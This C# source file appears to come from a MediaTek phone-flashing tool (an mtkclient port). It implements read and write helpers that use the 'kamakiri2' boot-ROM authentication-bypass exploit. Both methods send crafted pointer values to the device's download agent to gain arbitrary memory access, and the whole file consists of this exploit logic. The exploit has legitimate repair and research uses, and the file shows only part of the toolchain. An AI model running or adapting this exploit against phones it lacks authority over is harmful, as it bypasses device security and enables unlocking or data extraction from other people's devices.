using System;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace mtkclient.library.xflash
{
    internal class MtkAuthExploitDaService
    {
        public static async Task<byte[]> ReadAsync(
            IMtkUsbDevice device,
            MtkChipConfig chipConfig,
            byte[] lineCodeBuff,
            uint address,
            int length,
            bool check,
            CancellationToken cancellationToken
        )
        {
            if (chipConfig.WdgAddress.HasValue && chipConfig.PtrDa.HasValue)
            {
                Console.WriteLine("Registering access 1 at address 0");
                await MtkAuthExploitBromService.RegisterAsync(
                    device,
                    0U,
                    1,
                    check: true,
                    cancellationToken
                );
                Console.WriteLine("Reading wdg + 0x50");
                await MtkReadWrite32Service.ReadResultAsync(
                    device,
                    (uint)(chipConfig.WdgAddress.Value + 80),
                    1,
                    little: false,
                    cancellationToken
                );
                uint i = 0U;
                while (i < 3)
                {
                    uint num = (uint)(chipConfig.PtrDa.Value + 8 - 3 + i);
                    Console.WriteLine("Sending ptr da: 0x{0:X8}", num);
                    await MtkAuthExploitKamakiriService.DoKamakiri2Async(
                        device,
                        lineCodeBuff,
                        num,
                        cancellationToken
                    );
                    uint num2 = (uint)(i + 1);
                    i = num2;
                }
                if (address >= 64)
                {
                    i = 0U;
                    while (i < 3)
                    {
                        uint num3 = (uint)(chipConfig.PtrDa.Value - 5 + (3 - i));
                        Console.WriteLine("Sending ptr da > 0x40: 0x:{0:X8}", num3);
                        await MtkAuthExploitKamakiriService.DoKamakiri2Async(
                            device,
                            lineCodeBuff,
                            num3,
                            cancellationToken
                        );
                        uint num2 = (uint)(i + 1);
                        i = num2;
                    }
                    Console.WriteLine("Reading brom response");
                    return await MtkAuthExploitBromService.RegisterAsync(
                        device,
                        (uint)(address - 64),
                        length,
                        check,
                        cancellationToken
                    );
                }
                i = 0U;
                while (i < 4)
                {
                    uint num4 = (uint)(chipConfig.PtrDa.Value - 6 + (4 - i));
                    Console.WriteLine("Sending ptr da < 0x40: 0x:{0:X8}", num4);
                    await MtkAuthExploitKamakiriService.DoKamakiri2Async(
                        device,
                        lineCodeBuff,
                        num4,
                        cancellationToken
                    );
                    uint num2 = (uint)(i + 1);
                    i = num2;
                }
                Console.WriteLine("Reading brom response");
                return await MtkAuthExploitBromService.RegisterAsync(
                    device,
                    address,
                    length,
                    check,
                    cancellationToken
                );
            }
            MessageBox.Show(
                "Device Security Is Not Supported... Please Use Other Device!",
                "Info!",
                MessageBoxButtons.OK
            );
            return null;
        }

        public static async Task WriteAsync(
            IMtkUsbDevice device,
            MtkChipConfig chipConfig,
            byte[] lineCodeBuff,
            uint address,
            int length,
            byte[] data,
            bool check,
            CancellationToken cancellationToken
        )
        {
            if (chipConfig.WdgAddress.HasValue && chipConfig.PtrDa.HasValue)
            {
                Console.WriteLine("Registering access 1 at address 0");
                await MtkAuthExploitBromService.RegisterAsync(
                    device,
                    0U,
                    1,
                    check: true,
                    cancellationToken
                );
                Console.WriteLine("Reading wdg + 0x50");
                await MtkReadWrite32Service.ReadResultAsync(
                    device,
                    (uint)(chipConfig.WdgAddress.Value + 80),
                    1,
                    little: false,
                    cancellationToken
                );
                uint i = 0U;
                while (i < 3)
                {
                    uint num = (uint)(chipConfig.PtrDa.Value + 8 - 3 + i);
                    Console.WriteLine("Sending ptr da: 0x{0:X8}", num);
                    await MtkAuthExploitKamakiriService.DoKamakiri2Async(
                        device,
                        lineCodeBuff,
                        num,
                        cancellationToken
                    );
                    uint num2 = (uint)(i + 1);
                    i = num2;
                }
                if (address < 64)
                {
                    i = 0U;
                    while (i < 4)
                    {
                        uint num3 = (uint)(chipConfig.PtrDa.Value - 6 + (4 - i));
                        Console.WriteLine("Sending ptr da < 0x40: 0x:{0:X8}", num3);
                        await MtkAuthExploitKamakiriService.DoKamakiri2Async(
                            device,
                            lineCodeBuff,
                            num3,
                            cancellationToken
                        );
                        uint num2 = (uint)(i + 1);
                        i = num2;
                    }
                    Console.WriteLine("Reading brom response");
                    await MtkAuthExploitBromService.RegisterAsync(
                        device,
                        address,
                        length,
                        data,
                        check,
                        cancellationToken
                    );
                }
                else
                {
                    i = 0U;
                    while (i < 3)
                    {
                        uint num4 = (uint)(chipConfig.PtrDa.Value - 5 + (3 - i));
                        Console.WriteLine("Sending ptr da > 0x40: 0x:{0:X8}", num4);
                        await MtkAuthExploitKamakiriService.DoKamakiri2Async(
                            device,
                            lineCodeBuff,
                            num4,
                            cancellationToken
                        );
                        uint num2 = (uint)(i + 1);
                        i = num2;
                    }
                    Console.WriteLine("Reading brom response");
                    await MtkAuthExploitBromService.RegisterAsync(
                        device,
                        (uint)(address - 64),
                        length,
                        data,
                        check,
                        cancellationToken
                    );
                }
                return;
            }
            MessageBox.Show(
                "Device Security Is Not Supported... Please Use Other Device!",
                "Info!",
                MessageBoxButtons.OK
            );
            return;
        }
    }
}
